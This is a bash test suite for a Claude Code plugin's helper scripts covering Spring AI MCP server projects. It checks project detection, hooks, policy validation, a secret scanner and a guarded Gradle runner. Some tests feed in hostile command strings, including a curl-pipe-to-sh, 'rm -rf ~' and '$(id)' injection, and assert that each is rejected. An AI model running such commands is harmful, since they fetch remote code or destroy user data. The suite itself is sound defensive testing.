#!/usr/bin/env bash
# tests/run.sh - smoke tests for the plugin's scripts against the fixture projects in tests/fixtures/.
#
# Each fixture is copied to a temp directory first (the scripts under test never write into the
# repository). Every assertion prints PASS or FAIL; the exit status is non-zero when any FAIL.
# Needs bash, awk, find, git (source-tree-hash.sh); python only validates JSON output and is
# skipped when absent; jq is never required (the hook's jq path runs too when jq is installed).
#
# Usage: bash tests/run.sh
set -u
export LC_ALL=C

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
SCRIPTS="$HERE/../scripts"
DETECT="$SCRIPTS/detect-project.sh"
HOOK="$SCRIPTS/validate-build-state.sh"
WORK=$(mktemp -d "${TMPDIR:-/tmp}/mcp-plugin-tests.XXXXXX") || exit 1
trap 'rm -rf "$WORK"' EXIT
cp -R "$HERE/fixtures/." "$WORK/"

PASSED=0; FAILED=0
pass() { PASSED=$((PASSED + 1)); printf 'PASS  %s\n' "$1"; }
fail() { FAILED=$((FAILED + 1)); printf 'FAIL  %s\n' "$1"; [ -n "${2:-}" ] && printf '      %s\n' "$2"; return 0; }
eq() {   # name expected actual
  if [ "$2" = "$3" ]; then pass "$1"; else fail "$1" "expected [$2], got [$3]"; fi
}
has() {   # name haystack needle
  case $2 in *"$3"*) pass "$1" ;; *) fail "$1" "[$3] not in [$2]" ;; esac
}
hasnt() {   # name haystack needle
  case $2 in *"$3"*) fail "$1" "[$3] unexpectedly in [$2]" ;; *) pass "$1" ;; esac
}

# JSON validation: python when it works (the Windows `python3` store stub does not), else skipped
PY=""
for c in python3 python; do
  if command -v "$c" >/dev/null 2>&1 && "$c" -c 'import json' >/dev/null 2>&1; then PY=$c; break; fi
done
[ -n "$PY" ] || echo "note: no python -- JSON validity checks are skipped"
valid_json() {   # name text
  [ -n "$PY" ] || return 0
  if printf '%s' "$2" | "$PY" -c 'import json,sys; json.load(sys.stdin)' >/dev/null 2>&1; then pass "$1: valid JSON"
  else fail "$1: valid JSON" "$2"; fi
}

# detect-project.sh prints one `  "key": value,` line per key -- enough to read a value back
jget() {   # json key -> the value token
  local line
  while IFS= read -r line; do
    case $line in "  \"$2\": "*) line=${line#*\": }; printf '%s' "${line%,}"; return 0 ;; esac
  done <<< "$1"
  printf '<missing>'
}

detect() {   # dir [args] -> OUT, ERR, RC
  local d=$1; shift
  OUT=$(cd "$WORK/$d" && bash "$DETECT" "$@" 2>"$WORK/.err"); RC=$?
  ERR=$(cat "$WORK/.err")
}

echo "== detect-project.sh: Groovy single-module"
detect groovy-single
eq "groovy: exit 0" 0 "$RC"
valid_json "groovy" "$OUT"
eq "groovy: javaVersion (toolchain)" '"21"' "$(jget "$OUT" javaVersion)"
eq "groovy: springBootVersion" '"3.5.0"' "$(jget "$OUT" springBootVersion)"
eq "groovy: springAiVersion (ext { set(...) })" '"1.0.1"' "$(jget "$OUT" springAiVersion)"
eq "groovy: buildTool" '"gradle-groovy"' "$(jget "$OUT" buildTool)"
eq "groovy: gradleCommand (wrapper)" '"./gradlew"' "$(jget "$OUT" gradleCommand)"
eq "groovy: moduleDir" '"."' "$(jget "$OUT" moduleDir)"
eq "groovy: basePackage" '"com.acme.mcp"' "$(jget "$OUT" basePackage)"
eq "groovy: toolsPackage" '"com.acme.mcp.tools"' "$(jget "$OUT" toolsPackage)"
eq "groovy: transports (commented-out webflux ignored)" '["webmvc"]' "$(jget "$OUT" transports)"
eq "groovy: security (commented-out starters ignored)" '"none"' "$(jget "$OUT" security)"
eq "groovy: readOnly" 'true' "$(jget "$OUT" readOnly)"
eq "groovy: readOnlySource" '"archunit"' "$(jget "$OUT" readOnlySource)"
eq "groovy: contractSnapshot" '"src/test/resources/tool-contract.snapshot.json"' "$(jget "$OUT" contractSnapshot)"
eq "groovy: contractTest" '"ToolContractSnapshotTest"' "$(jget "$OUT" contractTest)"
eq "groovy: contractActual" '"build/tool-contract.actual.json"' "$(jget "$OUT" contractActual)"
eq "groovy: contractChangelog" '"docs/tool-contract-changelog.md"' "$(jget "$OUT" contractChangelog)"
eq "groovy: coverage (jacoco)" 'true' "$(jget "$OUT" coverage)"
eq "groovy: lombokEnabled" 'true' "$(jget "$OUT" lombokEnabled)"
eq "groovy: toolClassCount" '1' "$(jget "$OUT" toolClassCount)"
eq "groovy: policyFile" 'false' "$(jget "$OUT" policyFile)"
has "groovy: no-auth warning" "$(jget "$OUT" warnings)" "no inbound authentication"
hasnt "groovy: no two-transport warning" "$(jget "$OUT" warnings)" "both webmvc and webflux"
detect groovy-single --summary
eq "groovy: --summary" "[Backend MCP Plugin] Java 21 | Boot 3.5.0 | Spring AI 1.0.1 | webmvc | 1 tool classes | read-only | contract snapshot" "$(printf '%s\n' "$OUT" | head -1)"
has "groovy: --summary warning line" "$OUT" "  warning: HTTP MCP transport with no inbound authentication"
detect groovy-single --get contractSnapshot contractChangelog workDocDir
eq "groovy: --get several keys" "src/test/resources/tool-contract.snapshot.json
docs/tool-contract-changelog.md
work/features" "$OUT"
detect groovy-single --get descriptionConvention
eq "groovy: --get null prints an empty line" "" "$OUT"
detect groovy-single --get noSuchKey
eq "groovy: --get unknown key exits 64" 64 "$RC"
detect groovy-single --bogus
eq "bad option exits 64" 64 "$RC"

echo "== detect-project.sh: Kotlin DSL + webflux + version catalog"
detect kotlin-catalog
eq "kotlin: exit 0" 0 "$RC"
valid_json "kotlin" "$OUT"
eq "kotlin: javaVersion (jvmToolchain)" '"17"' "$(jget "$OUT" javaVersion)"
eq "kotlin: springBootVersion (catalog plugin, version.ref)" '"3.5.0"' "$(jget "$OUT" springBootVersion)"
eq "kotlin: springAiVersion (catalog BOM)" '"1.1.0"' "$(jget "$OUT" springAiVersion)"
eq "kotlin: buildTool" '"gradle-kotlin"' "$(jget "$OUT" buildTool)"
eq "kotlin: gradleCommand (no wrapper)" '"gradle"' "$(jget "$OUT" gradleCommand)"
eq "kotlin: transports (catalog starter)" '["webflux"]' "$(jget "$OUT" transports)"
eq "kotlin: security (catalog bundle)" '"oauth2-resource-server"' "$(jget "$OUT" security)"
eq "kotlin: toolsPackage = common parent" '"com.acme.flux"' "$(jget "$OUT" toolsPackage)"
eq "kotlin: toolPackages sorted" '["com.acme.flux.a", "com.acme.flux.b"]' "$(jget "$OUT" toolPackages)"
has "kotlin: common-parent warning" "$(jget "$OUT" warnings)" "common parent com.acme.flux"
eq "kotlin: toolClassCount (bare @Tool line counts)" '2' "$(jget "$OUT" toolClassCount)"

echo "== detect-project.sh: multi-module (server in services/mcp)"
detect multi-module
eq "multi: exit 0" 0 "$RC"
valid_json "multi" "$OUT"
eq "multi: moduleDir" '"services/mcp"' "$(jget "$OUT" moduleDir)"
eq "multi: sourceDir" '"services/mcp/src/main/java"' "$(jget "$OUT" sourceDir)"
eq "multi: testDir" '"services/mcp/src/test/java"' "$(jget "$OUT" testDir)"
eq "multi: basePackage" '"com.acme.multi"' "$(jget "$OUT" basePackage)"
eq "multi: javaVersion (root subprojects block)" '"21"' "$(jget "$OUT" javaVersion)"
eq "multi: springBootVersion (root, apply false)" '"3.4.1"' "$(jget "$OUT" springBootVersion)"
eq "multi: springAiVersion (extra[...])" '"1.0.0"' "$(jget "$OUT" springAiVersion)"
eq "multi: security (sibling module)" '"spring-security"' "$(jget "$OUT" security)"
eq "multi: contractSnapshot under the module" '"services/mcp/src/test/resources/tool-contract.snapshot.json"' "$(jget "$OUT" contractSnapshot)"
eq "multi: contractActual under the module" '"services/mcp/build/tool-contract.actual.json"' "$(jget "$OUT" contractActual)"
eq "multi: contractChangelog (root docs)" '"docs/tool-contract-changelog.md"' "$(jget "$OUT" contractChangelog)"
eq "multi: no warnings" '[]' "$(jget "$OUT" warnings)"
detect multi-module --summary
has "multi: --summary names the module" "$OUT" "| module services/mcp |"

echo "== detect-project.sh: STDIO only, no sources"
detect stdio-only
eq "stdio: exit 0" 0 "$RC"
valid_json "stdio" "$OUT"
eq "stdio: javaVersion (VERSION_1_8)" '"8"' "$(jget "$OUT" javaVersion)"
eq "stdio: springAiVersion (versioned starter)" '"1.0.0"' "$(jget "$OUT" springAiVersion)"
eq "stdio: transports" '["stdio"]' "$(jget "$OUT" transports)"
eq "stdio: toolsPackage" 'null' "$(jget "$OUT" toolsPackage)"
has "stdio: toolsPackage-unresolved warning" "$(jget "$OUT" warnings)" "toolsPackage unresolved"
hasnt "stdio: no no-auth warning (no HTTP transport)" "$(jget "$OUT" warnings)" "no inbound authentication"

echo "== detect-project.sh: two HTTP transports"
detect both-http
eq "both: transports" '["webmvc", "webflux"]' "$(jget "$OUT" transports)"
has "both: two-transport warning" "$(jget "$OUT" warnings)" "both webmvc and webflux"

echo "== detect-project.sh: not an MCP server"
detect maven-only
eq "maven: exit 3" 3 "$RC"
has "maven: stderr says Maven" "$ERR" "Maven project"
detect non-mcp
eq "non-mcp: exit 2" 2 "$RC"
has "non-mcp: stderr names the starter" "$ERR" "No Spring AI MCP server starter"
mkdir -p "$WORK/empty"
detect empty
eq "empty dir: exit 2" 2 "$RC"

echo "== detect-project.sh: policy file"
POL="$WORK/policy"; cp -R "$WORK/groovy-single" "$POL"; mkdir -p "$POL/.claude"
cat > "$POL/.claude/backend-mcp-plugin.json" <<'EOF'
{
  "readOnly": false,
  "javaVersion": 17,
  "toolsPackage": "com.x.tools",
  "workingLanguage": "vi",
  "workDocDir": "C:\\docs\\w \"x\"",
  "nested": { "toolsPackage": "nested.must.not.win", "basePackage": "nor.this" },
  "transports": ["stdio"],
  "basePackage": "a\qb",
  "security": "gateway",
  "checkstyle": "yes",
  "unknownKey": 1
}
EOF
detect policy
eq "policy: exit 0" 0 "$RC"
valid_json "policy" "$OUT"
eq "policy: readOnly applied" 'false' "$(jget "$OUT" readOnly)"
eq "policy: readOnlySource" '"policy"' "$(jget "$OUT" readOnlySource)"
eq "policy: integer javaVersion applied as a string" '"17"' "$(jget "$OUT" javaVersion)"
eq "policy: toolsPackage applied, nested object ignored" '"com.x.tools"' "$(jget "$OUT" toolsPackage)"
eq "policy: basePackage with a bad escape rejected" '"com.acme.mcp"' "$(jget "$OUT" basePackage)"
eq "policy: transports array not overridable" '["webmvc"]' "$(jget "$OUT" transports)"
eq "policy: security outside the enum rejected" '"none"' "$(jget "$OUT" security)"
eq "policy: non-boolean checkstyle rejected" 'false' "$(jget "$OUT" checkstyle)"
eq "policy: overridden" '["javaVersion", "toolsPackage"]' "$(jget "$OUT" overridden)"
W=$(jget "$OUT" warnings)
has "policy: warning for transports" "$W" '\"transports\" is derived'
has "policy: warning for bad escape" "$W" '\"basePackage\" is not a valid JSON string'
has "policy: warning for enum" "$W" '\"security\" must be one of'
has "policy: warning for boolean" "$W" '\"checkstyle\" must be true or false'
has "policy: warning for unknown key" "$W" '\"unknownKey\" is not a config key'
hasnt "policy: nested keys not seen" "$W" 'nor.this'
detect policy --get workDocDir
eq "policy: --get fully unescapes" 'C:\docs\w "x"' "$OUT"
detect policy --get workingLanguage
eq "policy: --get policy key" 'vi' "$OUT"
detect policy --summary
eq "policy: --summary uses resolved values" "[Backend MCP Plugin] Java 17 | Boot 3.5.0 | Spring AI 1.0.1 | webmvc | 1 tool classes | read-write | contract snapshot" "$(printf '%s\n' "$OUT" | head -1)"
printf '{ "readOnly": false,\n  "workDocDir": "docs/work"\n' > "$POL/.claude/backend-mcp-plugin.json"
detect policy
valid_json "policy (no closing brace)" "$OUT"
eq "policy (no closing brace): nothing applied" 'true' "$(jget "$OUT" readOnly)"
has "policy (no closing brace): warning" "$(jget "$OUT" warnings)" "not a well-formed flat JSON object"
printf '{ "moduleDir": "nowhere" }' > "$WORK/multi-module/.claude-policy" 2>/dev/null
mkdir -p "$WORK/multi-module/.claude"; mv "$WORK/multi-module/.claude-policy" "$WORK/multi-module/.claude/backend-mcp-plugin.json"
detect multi-module
eq "policy moduleDir missing dir: detection still finds the module" '"services/mcp"' "$(jget "$OUT" moduleDir)"
has "policy moduleDir missing dir: warning" "$(jget "$OUT" warnings)" "is not a directory"
printf '{ "moduleDir": "./services/mcp/" }' > "$WORK/multi-module/.claude/backend-mcp-plugin.json"
detect multi-module
eq "policy moduleDir: applied (normalized)" '"services/mcp"' "$(jget "$OUT" moduleDir)"
eq "policy moduleDir: overridden" '["moduleDir"]' "$(jget "$OUT" overridden)"
eq "policy moduleDir: sources read under it" '"com.acme.multi"' "$(jget "$OUT" basePackage)"
rm -rf "$WORK/multi-module/.claude"

echo "== validate-build-state.sh (PostToolUse hook)"
hook() {   # dir stdin -> HOUT, HRC
  HOUT=$(cd "$WORK/$1" && printf '%s' "$2" | bash "$HOOK" 2>&1); HRC=$?
}
MODES="nojq"; command -v jq >/dev/null 2>&1 && MODES="nojq jq"
for mode in $MODES; do
  if [ "$mode" = nojq ]; then export BACKEND_MCP_NO_JQ=1; else unset BACKEND_MCP_NO_JQ; fi
  hook groovy-single '{"session_id":"s","transcript_path":"C:\\t\\x.jsonl","tool_input":{"file_path":"C:\\w\\groovy-single\\build.gradle","content":"x"}}'
  eq "hook[$mode]: build.gradle edit exits 0" 0 "$HRC"
  has "hook[$mode]: build nudge" "$HOUT" '"additionalContext":"[Backend MCP Plugin] Build config changed.'
  valid_json "hook[$mode]: build nudge" "$HOUT"
  hook groovy-single '{"tool_input":{"file_path":"C:\\w\\groovy-single\\src\\test\\resources\\tool-contract.snapshot.json"}}'
  has "hook[$mode]: snapshot nudge (Windows path) names the changelog" "$HOUT" "docs/tool-contract-changelog.md"
  valid_json "hook[$mode]: snapshot nudge" "$HOUT"
  hook groovy-single '{"tool_input":{"file_path":"/w/groovy-single/package.json"}}'
  eq "hook[$mode]: unrelated JSON is silent" "" "$HOUT"
  hook groovy-single '{"tool_input":{"file_path":"src/main/java/com/acme/mcp/App.java","content":"\"file_path\": \"build.gradle\""}}'
  eq "hook[$mode]: Java edit is silent" "" "$HOUT"
  hook groovy-single 'not json at all'
  eq "hook[$mode]: garbage stdin exits 0" 0 "$HRC"
  eq "hook[$mode]: garbage stdin is silent" "" "$HOUT"
  hook non-mcp '{"tool_input":{"file_path":"build.gradle"}}'
  eq "hook[$mode]: non-MCP project is silent" "" "$HOUT"
  hook multi-module '{"tool_input":{"file_path":"/w/multi-module/services/mcp/src/test/resources/tool-contract.snapshot.json"}}'
  has "hook[$mode]: multi-module snapshot nudge" "$HOUT" "Tool contract snapshot changed"
  hook kotlin-catalog '{"tool_input":{"path":"gradle/libs.versions.toml"}}'
  has "hook[$mode]: catalog edit nudges (tool_input.path)" "$HOUT" "Build config changed"
done
unset BACKEND_MCP_NO_JQ
[ "$MODES" = nojq ] && echo "note: jq not installed -- the hook's jq path was not exercised"

echo "== session-init.sh (SessionStart hook)"
export CLAUDE_CONFIG_DIR="$WORK/.claude-config"   # anything the hook wrote would land here, not in ~/.claude
mkdir -p "$WORK/groovy-single/work/features"
printf -- '- [x] one\n- [ ] two\n' > "$WORK/groovy-single/work/features/get-weather.md"
SOUT=$(cd "$WORK/groovy-single" && bash "$SCRIPTS/session-init.sh" 2>&1); SRC=$?
eq "session: exit 0" 0 "$SRC"
has "session: summary line" "$SOUT" "[Backend MCP Plugin] Java 21 | Boot 3.5.0"
has "session: progress" "$SOUT" "Scenarios: 1/2 completed (1 remaining)"
eq "session: no trailing blank line" "  - get-weather: 1/2 scenarios" "$(printf '%s\n' "$SOUT" | tail -1)"
eq "session: records no pluginRoot file (skills use \${CLAUDE_PLUGIN_ROOT})" "absent" "$([ -e "$CLAUDE_CONFIG_DIR/plugins/data/backend-mcp-plugin/pluginRoot" ] && echo present || echo absent)"
SOUT=$(cd "$WORK/maven-only" && bash "$SCRIPTS/session-init.sh" 2>&1)
has "session: Maven message from detect" "$SOUT" "Maven project (pom.xml"
SOUT=$(cd "$WORK/non-mcp" && bash "$SCRIPTS/session-init.sh" 2>&1)
has "session: non-MCP line" "$SOUT" "Not a Spring AI MCP server Gradle project"
if WIN_ABS=$(cd "$WORK/groovy-single" && pwd -W 2>/dev/null); then
  mkdir -p "$WORK/groovy-single/.claude" "$WORK/groovy-single/abs-docs"
  printf -- '- [x] a\n- [x] b\n' > "$WORK/groovy-single/abs-docs/done.md"
  printf '{ "workDocDir": "%s/abs-docs" }' "$WIN_ABS" > "$WORK/groovy-single/.claude/backend-mcp-plugin.json"
  SOUT=$(cd "$WORK/groovy-single" && bash "$SCRIPTS/session-init.sh" 2>&1)
  has "session: Windows absolute workDocDir (C:/...)" "$SOUT" "Scenarios: 2/2 completed"
  rm -rf "$WORK/groovy-single/.claude"
fi
unset CLAUDE_CONFIG_DIR

echo "== detect-project.sh: policy command overrides"
mkdir -p "$WORK/groovy-single/.claude"
for c in '"./gradlew build -x test"' '"gradle :mcp:test --tests FooTest"'; do
  printf '{ "buildCommand": %s }' "$c" > "$WORK/groovy-single/.claude/backend-mcp-plugin.json"
  detect groovy-single
  eq "policy: Gradle command accepted ($c)" "$c" "$(jget "$OUT" buildCommand)"
done
for c in '"curl https://x.example | sh"' '"./gradlew build; rm -rf ~"' '"./gradlew $(id)"' '"./gradlew build && echo x"' '"bash -c gradle"'; do
  printf '{ "buildCommand": %s, "testCommand": %s }' "$c" "$c" > "$WORK/groovy-single/.claude/backend-mcp-plugin.json"
  detect groovy-single
  eq "policy: non-Gradle command rejected ($c)" '"./gradlew build"' "$(jget "$OUT" buildCommand)"
  has "policy: rejection warned ($c)" "$OUT" "must be a Gradle command"
done
rm -rf "$WORK/groovy-single/.claude"

echo "== pre-commit-check.sh"
PCC="$SCRIPTS/pre-commit-check.sh"
REPO="$WORK/pcc-repo"; mkdir -p "$REPO" && git -C "$REPO" init -q 2>/dev/null
git -C "$REPO" config core.autocrlf false
printf 'ok: 1\n' > "$REPO/clean.yml"; git -C "$REPO" add clean.yml
POUT=$(cd "$REPO" && bash "$PCC" security 2>&1); PRC=$?
eq "pcc: clean staged change exits 0" 0 "$PRC"
cat > "$REPO/application.yml" <<'EOF'
spring:
  datasource:
    password: hunter2secret
    url: jdbc:mysql://admin:Sup3rPass@db.local/x
openai: sk-proj-abcdefghijklmnopqrstuvwxyz123456
EOF
printf 'class A { String apiKey = "AbCdEf123456ZZ"; }\n' > "$REPO/A.java"
git -C "$REPO" add application.yml A.java
POUT=$(cd "$REPO" && bash "$PCC" security 2>&1); PRC=$?
eq "pcc: findings exit 1 (not 2)" 1 "$PRC"
has "pcc: finding names the file" "$POUT" "application.yml: "
has "pcc: finding names the java file" "$POUT" "A.java: "
for v in hunter2secret Sup3rPass abcdefghijklmnopqrstuvwxyz123456 AbCdEf123456ZZ; do
  hasnt "pcc: value masked ($v)" "$POUT" "$v"
done
POUT=$(cd "$WORK" && bash "$PCC" security 2>&1); PRC=$?
eq "pcc: not a repo exits 2 (scan did not run)" 2 "$PRC"
(cd "$REPO" && bash "$PCC" nonsense >/dev/null 2>&1); eq "pcc: usage error exits 64" 64 "$?"

echo "== pipeline-state.sh (lock)"
PS="$SCRIPTS/pipeline-state.sh"
LP="$WORK/lockproj"; mkdir -p "$LP"; cd "$LP"
RUN=$(bash "$PS" lock acquire wd mcp-code get-x 2>/dev/null); LRC=$?
eq "lock: acquire exits 0" 0 "$LRC"
if [[ $RUN =~ ^[A-Za-z0-9-]{8,64}$ ]]; then pass "lock: acquire prints a runId"; else fail "lock: acquire prints a runId" "$RUN"; fi
bash "$PS" lock acquire wd mcp-verify >/dev/null 2>&1; eq "lock: second acquire is busy (75)" 75 "$?"
bash "$PS" lock refresh wd "$RUN" 2>/dev/null; eq "lock: owner refresh" 0 "$?"
bash "$PS" lock refresh wd deadbeefdeadbeef 2>/dev/null; eq "lock: foreign refresh refused (1)" 1 "$?"
SNAP=$(bash "$PS" lock snapshot wd "$RUN" 2>/dev/null)
[ -d "$SNAP" ] && pass "lock: snapshot dir created" || fail "lock: snapshot dir created" "$SNAP"
eq "lock: snapshot dir is stable per run" "$SNAP" "$(bash "$PS" lock snapshot wd "$RUN" 2>/dev/null)"
bash "$PS" lock release wd mcp-verify "$RUN" 2>/dev/null; eq "lock: release with the wrong operation refused" 1 "$?"
bash "$PS" lock release wd mcp-code "$RUN" 2>/dev/null; eq "lock: owner release" 0 "$?"
eq "lock: file removed" absent "$([ -e wd/.progress/.lock ] && echo present || echo absent)"
eq "lock: snapshot removed" absent "$([ -e "$SNAP" ] && echo present || echo absent)"
mkdir -p victim && : > victim/keep
printf '{ "lockedAt": "x", "operation": "mcp-fix", "feature": "", "runId": "aaaaaaaaaaaa", "snapshotDir": "%s" }\n' "$LP/victim" > wd/.progress/.lock
touch -t 200001010000 wd/.progress/.lock
bash "$PS" lock acquire wd mcp-fix >/dev/null 2>&1; eq "lock: stale lock replaced" 0 "$?"
eq "lock: forged snapshotDir not deleted" present "$([ -e victim/keep ] && echo present || echo absent)"
bash "$PS" lock acquire wd bogus >/dev/null 2>&1; eq "lock: unknown operation (64)" 64 "$?"
bash "$PS" lock acquire wd2 mcp-code ../x >/dev/null 2>&1; eq "lock: path-like feature refused (64)" 64 "$?"
cd "$HERE"

echo "== junit-summary.sh"
JS="$SCRIPTS/junit-summary.sh"
JP="$WORK/junitproj"; mkdir -p "$JP/build/test-results/test" "$JP/buildSrc/build/test-results/test"
cat > "$JP/build/test-results/test/TEST-com.x.FooTest.xml" <<'EOF'
<testsuite name="com.x.FooTest" tests="3" skipped="1" failures="1" errors="0" time="0.1">
  <testcase name="ok()" classname="com.x.FooTest" time="0.01"/>
  <testcase name="bad()" classname="com.x.FooTest" time="0.02">
    <failure message="expected: &lt;1&gt; but was: &lt;2&gt;" type="AssertionFailedError">AssertionFailedError: expected: &lt;1&gt; but was: &lt;2&gt;
	at com.x.FooTest.bad(FooTest.java:42)
</failure>
  </testcase>
</testsuite>
EOF
printf '<testsuite name="com.x.FooTest$In" tests="1" skipped="0" failures="0" errors="1">\n<testcase name="boom()" classname="com.x.FooTest$In"><error message="NPE" type="NPE">NPE\n at com.x.Foo.run(Foo.java:7)\n</error></testcase>\n</testsuite>\n' > "$JP/build/test-results/test/TEST-com.x.FooTest\$In.xml"
echo '<testsuite name="com.x.FooTestIT" tests="5" skipped="0" failures="0" errors="0">' > "$JP/build/test-results/test/TEST-com.x.FooTestIT.xml"
echo '<testsuite name="b" tests="9" skipped="0" failures="0" errors="0">' > "$JP/buildSrc/build/test-results/test/TEST-b.xml"
JOUT=$(bash "$JS" --root "$JP")
has "junit: totals, buildSrc excluded" "$JOUT" "junit: xml=3 tests=9 failures=1 errors=1 skipped=1 passed=6"
has "junit: failure line, entities decoded" "$JOUT" "FAIL com.x.FooTest > bad(): expected: <1> but was: <2>"
has "junit: stack top" "$JOUT" "at com.x.FooTest.bad(FooTest.java:42)"
JOUT=$(bash "$JS" --root "$JP" --class com.x.FooTest)
has "junit: --class takes nested files, not FooTestIT" "$JOUT" "junit: xml=2 tests=4"
JOUT=$(bash "$JS" --root "$JP" --class '*FooTestIT')
has "junit: --class suffix match" "$JOUT" "junit: xml=1 tests=5"
: > "$JP/marker"; touch -t 203001010000 "$JP/marker"
JOUT=$(bash "$JS" --root "$JP" --newer "$JP/marker")
has "junit: --newer excludes older results" "$JOUT" "junit: xml=0"
bash "$JS" --class 'a;b' >/dev/null 2>&1; eq "junit: invalid class refused (64)" 64 "$?"

echo "== run-gradle.sh"
RG="$SCRIPTS/run-gradle.sh"
GP="$WORK/gradleproj"; mkdir -p "$GP"
cat > "$GP/gradlew" <<'EOF'
#!/usr/bin/env bash
mkdir -p build/test-results/test
case "$MODE" in
  pass) echo '<testsuite name="com.x.FooTest" tests="2" skipped="0" failures="0" errors="0">' > build/test-results/test/TEST-com.x.FooTest.xml; echo noise; exit 0 ;;
  fail) printf '<testsuite name="com.x.FooTest" tests="2" skipped="0" failures="1" errors="0">\n<testcase name="bad()" classname="com.x.FooTest"><failure message="boom" type="AE">AE\n at com.x.FooTest.bad(FooTest.java:9)\n</failure></testcase>\n</testsuite>\n' > build/test-results/test/TEST-com.x.FooTest.xml; exit 1 ;;
  compile) echo "Foo.java:3: error: cannot find symbol"; exit 1 ;;
  none) exit 0 ;;
esac
EOF
cd "$GP"
GOUT=$(MODE=pass bash "$RG" --cmd "./gradlew test" --tests com.x.FooTest); GRC=$?
eq "gradle: ran (0)" 0 "$GRC"; has "gradle: pass exit line" "$GOUT" "exit=0 log=(deleted"; has "gradle: pass counts" "$GOUT" "tests=2 failures=0"
hasnt "gradle: raw output kept out" "$GOUT" "noise"
GOUT=$(MODE=fail bash "$RG" --cmd "./gradlew test" --tests com.x.FooTest)
has "gradle: failing test reported" "$GOUT" "FAIL com.x.FooTest > bad(): boom"
GLOG=$(printf '%s\n' "$GOUT" | sed -n 's/^exit=1 log=//p'); [ -f "$GLOG" ] && pass "gradle: failing run keeps its log" || fail "gradle: failing run keeps its log" "$GOUT"; rm -f "$GLOG"
GOUT=$(MODE=compile bash "$RG" --cmd "./gradlew test" --tests com.x.FooTest)
has "gradle: compile error surfaced" "$GOUT" "error: cannot find symbol"; rm -f "$(printf '%s\n' "$GOUT" | sed -n 's/^exit=1 log=//p')"
GOUT=$(MODE=none bash "$RG" --cmd "./gradlew test" --tests com.x.Nope)
has "gradle: no result is never a pass" "$GOUT" "nothing was tested"
bash "$RG" --cmd "./gradlew test; rm -rf ~" >/dev/null 2>&1; eq "gradle: shell command refused (64)" 64 "$?"
GRUN=$(bash "$SCRIPTS/pipeline-state.sh" lock acquire wd mcp-verify 2>/dev/null)
GOUT=$(MODE=pass bash "$RG" --cmd "./gradlew classes" --lock wd "$GRUN"); has "gradle: lock refreshed" "$GOUT" "lock: refreshed"
MODE=pass bash "$RG" --cmd "./gradlew classes" --lock wd deadbeefdeadbeef >/dev/null 2>&1; eq "gradle: lost lock exits 3" 3 "$?"
cd "$HERE"

echo "== review-scope.sh"
RSC="$SCRIPTS/review-scope.sh"
RP="$WORK/scopeproj"; mkdir -p "$RP/src/main/java/a" "$RP/src/test/java/a" "$RP/src/main/java/a/build" "$RP/empty"
echo A > "$RP/src/main/java/a/A.java"; echo B > "$RP/src/main/java/a/B.java"; echo T > "$RP/src/test/java/a/AT.java"; echo x > "$RP/src/main/java/a/build/Gen.java"
cd "$RP"
bash "$RSC" manifest m.txt src/main/java/a src/test/java/a; eq "scope: manifest written" 0 "$?"
hasnt "scope: build/ skipped" "$(cat m.txt)" "Gen.java"
eq "scope: unchanged tree lists nothing" "" "$(bash "$RSC" changed m.txt src/main/java/a src/test/java/a)"
echo A2 >> src/main/java/a/A.java; rm src/main/java/a/B.java; echo C > "src/main/java/a/C D.java"
SOUT=$(bash "$RSC" changed m.txt src/main/java/a src/test/java/a)
has "scope: modified" "$SOUT" "M src/main/java/a/A.java"; has "scope: deleted" "$SOUT" "D src/main/java/a/B.java"; has "scope: added (space in name)" "$SOUT" "A src/main/java/a/C D.java"
hasnt "scope: untouched test not listed" "$SOUT" "AT.java"
bash "$RSC" changed nope.txt src >/dev/null 2>&1; eq "scope: no manifest exits 2" 2 "$?"
bash "$RSC" changed m.txt ../x >/dev/null 2>&1; eq "scope: path outside the project refused" 64 "$?"
bash "$RSC" manifest e.txt empty; eq "scope: empty dir gives an empty manifest" 0 "$(wc -c < e.txt | tr -d ' ')"
cd "$HERE"

echo "== source-tree-hash.sh (shares lib-modules.sh with detect)"
H1=$(cd "$WORK/multi-module" && bash "$SCRIPTS/source-tree-hash.sh" 2>&1)
if [[ $H1 =~ ^[0-9a-f]{40}$ ]]; then pass "hash: a tree id"; else fail "hash: a tree id" "$H1"; fi
echo "// edit" >> "$WORK/multi-module/services/mcp/src/main/java/com/acme/multi/MultiApp.java"
H2=$(cd "$WORK/multi-module" && bash "$SCRIPTS/source-tree-hash.sh" 2>&1)
if [ "$H1" != "$H2" ]; then pass "hash: a depth-2 module source edit changes it"; else fail "hash: a depth-2 module source edit changes it"; fi
echo "// edit" >> "$WORK/multi-module/common/build.gradle.kts"
H3=$(cd "$WORK/multi-module" && bash "$SCRIPTS/source-tree-hash.sh" 2>&1)
if [ "$H2" != "$H3" ]; then pass "hash: a sibling module build edit changes it"; else fail "hash: a sibling module build edit changes it"; fi

echo "== bash 3.2 compatibility (static)"
B4=$(grep -nE 'declare -A|typeset -A|local -A|mapfile|readarray|\$\{[A-Za-z_]+(,,|\^\^)|;;&|\|&|&>>' "$SCRIPTS"/*.sh "$HERE/run.sh" 2>/dev/null | grep -v '^[^:]*:[0-9]*:[[:space:]]*#' | grep -v 'grep -nE' || true)
eq "no bash-4-only constructs" "" "$B4"
# bash < 4.4 under set -u aborts on "${A[@]}" of an empty array: detect-project.sh guards every one
UNGUARDED=$(grep -nE '(^|[^+])"\$\{!?[A-Za-z_]+\[[@*]\]\}"' "$DETECT" || true)
eq "detect-project.sh: every array expansion guarded" "" "$UNGUARDED"

echo
echo "passed: $PASSED  failed: $FAILED"
[ "$FAILED" -eq 0 ]
